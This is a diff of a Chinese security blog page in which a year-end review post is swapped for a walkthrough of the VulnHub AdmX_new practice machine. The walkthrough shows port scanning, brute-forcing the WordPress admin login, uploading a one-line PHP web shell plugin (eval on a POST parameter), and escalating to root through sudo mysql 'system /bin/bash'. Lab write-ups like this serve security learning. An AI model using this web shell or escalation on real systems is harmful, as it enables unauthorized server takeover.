@@ -16,24 +16,33 @@
   <meta name="author" content="Zjacky">
   <meta name="keywords" content="Zjacky">
   
-    <meta name="description" content="总结 - 2022年度总结前言偶然间翻到自己2022年在@星盟安全团队写的2022年报，于是看看自己当时如何写的，写了啥问题 ，立下了什么flag，因为现在也在写2023的总结了，感觉还是有点成长的 Zjacky-2022年报‍ 自己如何看待自己 多角度的剖析与反思 关于反思的话：首先我学习安全的时间是非常有限的，有句话说得好 “大一是为了明确大学剩下三年的努力的方向” 没错 我大一确实是在寻找我">
+    <meta name="description" content="‍ 前言打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧 ‍ 本次打靶非常适合入门级别的师傅 简单易懂 涉及知识点如下  信息收集 爆破 Nday 提权  ‍ 信息收集端口扫描得到三个端口开放 80 25 110 namp端口指纹一下 1nma">
 <meta property="og:type" content="article">
-<meta property="og:title" content="总结 - 2022年度总结">
-<meta property="og:url" content="https://zjackky.github.io/post/summary-2022-ziv4pi.html">
+<meta property="og:title" content="打靶 - VulnHub - AdmX_new">
+<meta property="og:url" content="https://zjackky.github.io/post/target-vulnhub-admxnew-z9aqij.html">
 <meta property="og:site_name" content="Zjacky Blog">
-<meta property="og:description" content="总结 - 2022年度总结前言偶然间翻到自己2022年在@星盟安全团队写的2022年报，于是看看自己当时如何写的，写了啥问题 ，立下了什么flag，因为现在也在写2023的总结了，感觉还是有点成长的 Zjacky-2022年报‍ 自己如何看待自己 多角度的剖析与反思 关于反思的话：首先我学习安全的时间是非常有限的，有句话说得好 “大一是为了明确大学剩下三年的努力的方向” 没错 我大一确实是在寻找我">
+<meta property="og:description" content="‍ 前言打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧 ‍ 本次打靶非常适合入门级别的师傅 简单易懂 涉及知识点如下  信息收集 爆破 Nday 提权  ‍ 信息收集端口扫描得到三个端口开放 80 25 110 namp端口指纹一下 1nma">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-12-30T11:53:46.000Z">
-<meta property="article:modified_time" content="2022-12-25T03:04:54.000Z">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128770.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128016.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128123.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128233.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128375.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128516.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128627.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128735.png">
+<meta property="article:published_time" content="2023-03-16T03:06:19.000Z">
+<meta property="article:modified_time" content="2024-01-06T03:28:54.000Z">
 <meta property="article:author" content="Zjacky">
-<meta property="article:tag" content="总结">
+<meta property="article:tag" content="打靶">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128770.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>总结 - 2022年度总结 - Zjacky Blog</title>
+  <title>打靶 - VulnHub - AdmX_new - Zjacky Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -240,7 +249,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="总结 - 2022年度总结"></span>
+            <span id="subtitle" data-typed-text="打靶 - VulnHub - AdmX_new"></span>
           
         </div>
 
@@ -251,8 +260,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-30 19:53" pubdate>
-          2022年12月30日 晚上
+        <time datetime="2023-03-16 11:06" pubdate>
+          2023年3月16日 上午
         </time>
       </span>
     
@@ -264,7 +273,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          1.4k 字
+          408 字
         
       </span>
     
@@ -324,12 +333,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">总结 - 2022年度总结</h1>
+            <h1 id="seo-header">打靶 - VulnHub - AdmX_new</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年12月25日 上午
+                    本文最后更新于：2024年1月6日 上午
                   
                 
               </p>
@@ -337,39 +346,66 @@
             
               <div class="markdown-body">
                 
-                <h1 id="总结-2022年度总结"><a href="#总结-2022年度总结" class="headerlink" title="总结 - 2022年度总结"></a>总结 - 2022年度总结</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间翻到自己2022年在@星盟安全团队写的2022年报，于是看看自己当时如何写的，写了啥问题 ，立下了什么flag，因为现在也在写2023的总结了，感觉还是有点成长的</p>
-<h1 id="Zjacky-2022年报"><a href="#Zjacky-2022年报" class="headerlink" title="Zjacky-2022年报"></a>Zjacky-2022年报</h1><p>‍</p>
-<h2 id="自己如何看待自己"><a href="#自己如何看待自己" class="headerlink" title="自己如何看待自己"></a>自己如何看待自己</h2><ul>
-<li><p>多角度的剖析与反思</p>
-<p>关于反思的话：首先我学习安全的时间是非常有限的，有句话说得好 “大一是为了明确大学剩下三年的努力的方向” 没错 我大一确实是在寻找我未来努力的方向，最后在大一下学期，也就是今年五月尾才开始去了解信息安全这个行业，刚开始对这个行业从了解CTF，学习安全知识，最初的时候真的好难熬，什么都看不懂就是硬看，花了三四个月左右吧，才相当于是能看懂吧，我之前其实没有接触过安全，只是略懂一点C语言，所以我是直接Web入门先的，过程比较艰难，不过我知道自己是愿意去学，努力去学的，也慢慢的了解什么叫触类旁通吧。其次 我有点不太容易去沉淀自己，甚至说”对自己过于相信了” 我很简单的例子 SQL注入，我看了一遍后觉得会了，自己写 忘记了 看了第二遍会了 自己在本地写会了 但是打CTF却不会，这就是没有真正沉淀自己的结果，所以在接下来的日子里面我希望我能够好好的把自己所学的，好好的内化，去总结，去加深印象！</p>
-</li>
-<li><p>发现和总结自己的方法</p>
-<p>首先我觉得我个人是一个在学习上有着很强烈欲望的人，在兴趣和坚持的驱使下我会更加有热度去学习这方面的知识，在学习的领域当中，我觉得很重要的东西就是 1 兴趣 2 不懂就要问 3 不要放过一切你不懂的点  这是我学习的方法吧，其实问这个东西真的很奇妙 ，你能问出来说明你思考了，对方能回答出来了对方说明真的理解了，在问与答的过程当中，就是一个提升自我的特别宝贵的经历，我十分珍惜那些骂我的，说我的师傅，其实只有骂 ，说，这样子才能把我发问的问题解决啊！ 这就是问题的艺术吧。</p>
-</li>
-</ul>
+                <p>‍</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p>
 <p>‍</p>
-<h2 id="今年做了哪些事情"><a href="#今年做了哪些事情" class="headerlink" title="今年做了哪些事情"></a>今年做了哪些事情</h2><ul>
-<li>2022粤盾护网行动</li>
-<li>中国机器人及人工智能大赛全国总决赛全国三等奖</li>
-<li>羊城杯三十多名</li>
-<li>挖了一些Edusrc吧拿了些证书</li>
-</ul>
+<p>本次打靶非常适合入门级别的师傅 简单易懂 涉及知识点如下</p>
+<ol>
+<li>信息收集</li>
+<li>爆破</li>
+<li>Nday</li>
+<li>提权</li>
+</ol>
 <p>‍</p>
-<h2 id="今年自己面临的挑战和遭遇的问题，以及如何去克服的"><a href="#今年自己面临的挑战和遭遇的问题，以及如何去克服的" class="headerlink" title="今年自己面临的挑战和遭遇的问题，以及如何去克服的"></a>今年自己面临的挑战和遭遇的问题，以及如何去克服的</h2><p>CTF中的知识点好多 路还有好远，在接下来的一年里面，我会积极参与团队各种比赛和活动，积极与师傅们一起讨论 学习</p>
-<p>‍</p>
-<h2 id="自己的劣势分析"><a href="#自己的劣势分析" class="headerlink" title="自己的劣势分析"></a>自己的劣势分析</h2><p>劣势上的话我在接下来的一年里我必须好好研究技术层次的问题，特别是关于代码审计上的能力，毕竟开发上的安全才是真正厉害的，对于在CTF上的话我也要跟好师傅们的步伐，在师傅们的带领下希望能够在比赛上输出，人文方面的话我希望能够广交朋友吧，人情世故还是很重要的！</p>
-<p>‍</p>
-<h2 id="今年那些喜悦、遗憾和最难忘的事"><a href="#今年那些喜悦、遗憾和最难忘的事" class="headerlink" title="今年那些喜悦、遗憾和最难忘的事"></a>今年那些喜悦、遗憾和最难忘的事</h2><p>我认为今年最大的喜悦就是能够遇到师傅们加入了@星盟安全团队，以及遇到了我很多安全上的好师傅们，他们愿意为我解答，为我引路，让我快速成长，特别感谢他们，比较遗憾的话就是我接触安全领域时间太短啦！大一上也算是忙着玩了，希望在接下来的路上再接再厉吧！</p>
-<p>‍</p>
-<p>‍</p>
-<h2 id="今年自己的进步与成长收获（和去年做一个比较）"><a href="#今年自己的进步与成长收获（和去年做一个比较）" class="headerlink" title="今年自己的进步与成长收获（和去年做一个比较）"></a>今年自己的进步与成长收获（和去年做一个比较）</h2><p>今年收获肯定很大，因为今年是我接触安全的第一年，首年肯定嘎嘎幸运，快速成长起来，去年我还是在为进入了个普通本科而发愁呢，当时高考不理想消沉了一段时间呢，不过这不重要了，既然选择了安全，那就在2023年不顾一切的冲吧</p>
-<p>‍</p>
-<p>‍</p>
-<h2 id="明年你对自己有哪些期望，以及明年的计划及flag"><a href="#明年你对自己有哪些期望，以及明年的计划及flag" class="headerlink" title="明年你对自己有哪些期望，以及明年的计划及flag"></a>明年你对自己有哪些期望，以及明年的计划及flag</h2><p>明年你对自己有哪些期望来年我会均衡好CTF和渗透的学习，边学边实践，flag的话我想挖到人生第一个CNVD，以及CTF大赛中获一次前三</p>
-<p>‍</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-comment"># 挖到人生第一个CNVD/CVE </span><br>2. <span class="hljs-comment"># 护网蓝中                                   </span><br>3. <span class="hljs-comment"># CTF赛事进一次前三                            </span><br>4. <span class="hljs-comment"># 跟女朋友长长久久                             </span><br>5. <span class="hljs-comment"># 拿到5张edu的证书                           </span><br>6. <span class="hljs-comment"># 搭建一台环境很棒的服务器                     	  </span><br>7. <span class="hljs-comment"># 在先知社区发表一篇文章                      </span><br>8. <span class="hljs-comment"># 打够一百台靶机(/100)                       </span><br>9. <span class="hljs-comment"># 做一次渗透的项目                           </span><br>10.<span class="hljs-comment"># 拿一次奖学金                               </span><br></code></pre></td></tr></table></figure>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描得到三个端口开放</p>
+<p>80 25 110</p>
+<p>namp端口指纹一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.184.139 -sC -p 110,80,25<br></code></pre></td></tr></table></figure>
 
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>我相信既然学不死就往死里学啊，家里不是能躺平的家庭就无脑向前冲吧，热爱安全，冲冲冲！团队太棒啦！真的给了我意想不到的一个集体，所有的师傅都是为了一个方向一起去学习，一起去讨论，师傅们都特别好，开会 总结 周报 聊天 等等 都让我们成为了一个很好的大家庭吧，我真的很荣幸加入并且珍惜这里的一切机会</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128770.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128016.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么先从80入手</p>
+<p>直接扫目录</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128123.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>跑出wordpress目录</p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>‍</p>
+<p>爆破后台</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128233.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>得到密码是adam14 成功进入后台</p>
+<p>‍</p>
+<h2 id="wordpressNday"><a href="#wordpressNday" class="headerlink" title="wordpressNday"></a>wordpressNday</h2><p>这里进行wordpress的后台getshell</p>
+<ol>
+<li>Media -&gt; 可以上传文件getshell</li>
+<li>Appearance -&gt; Theme view 直接php文件(404模版)写php反弹shell</li>
+<li>plugins 插件源码</li>
+</ol>
+<p>那么这里就是利用到新增加的插件来进行getshell</p>
+<p>写一个插件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Webshell</span><br><span class="hljs-comment">Plugin URI: http://wordpress.org/plugins/hello-dolly/</span><br><span class="hljs-comment">Description: zjacky</span><br><span class="hljs-comment">Author: zjacky</span><br><span class="hljs-comment">Version: 1.0</span><br><span class="hljs-comment">Author URI: http://ma.tt/</span><br><span class="hljs-comment">License: https://yuanfh.github.io</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;asd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure>
+
+<p>然后打包成zip上传激活</p>
+<p>默认的路径为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.184.139/wordpress/wp-content/plugins/wp-plugin.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128375.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上shell后进行提权先看suid</p>
+<p>emm好像也没啥东西</p>
+<p>但是发现home目录下有东西需要提权 ，所以先尝试su爆破，wpadmin，通过后台密码adam14成功登陆wpadmin</p>
+<p>得到了这个家目录下的东西，通过sudo -l 发现了存在suid 直接提权成root</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128516.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128627.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现不需要root密码的是这个mysql ，那么查看mysql的help的时候可以发现存在system的权限 通过system去执行系统命令从而拿到root的bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">system /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061128735.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>打靶结束</p>
+<p>‍</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>‍</p>
+<p>从web端扫到wordpress，通过爆破后台进入后台通过插件来写shell，然后通过密码复用来su到wpadmin上suid打mysql的system执行命令提权root</p>
+<p>‍</p>
 <p>‍</p>
 
                 
@@ -389,7 +425,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  <a href="/categories/%E6%89%93%E9%9D%B6/" class="category-chain-item">打靶</a>
   
   
 
@@ -404,7 +440,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%80%BB%E7%BB%93/" class="print-no-link">#总结</a>
+        <a href="/tags/%E6%89%93%E9%9D%B6/" class="print-no-link">#打靶</a>
       
     </div>
   
@@ -416,8 +452,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>总结 - 2022年度总结</div>
-      <div>https://zjackky.github.io/post/summary-2022-ziv4pi.html</div>
+      <div>打靶 - VulnHub - AdmX_new</div>
+      <div>https://zjackky.github.io/post/target-vulnhub-admxnew-z9aqij.html</div>
     </div>
     <div class="license-meta">
       
@@ -429,7 +465,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月30日</div>
+          <div>2023年3月16日</div>
         </div>
       
       
@@ -461,15 +497,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/post/target-vulnhub-ai-web-1-1a4xey.html" title="打靶 - VulnHub - AI-Web 1">
+                      <a href="/post/target-vulnhub-red-day-4-idb1b.html" title="打靶 - VulnHub - 红日(四)">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">打靶 - VulnHub - AI-Web 1</span>
+                        <span class="hidden-mobile">打靶 - VulnHub - 红日(四)</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/post/target-vulnhub-ai-web-1-1a4xey.html" title="打靶 - VulnHub - AI-Web 1">
+                        <span class="hidden-mobile">打靶 - VulnHub - AI-Web 1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
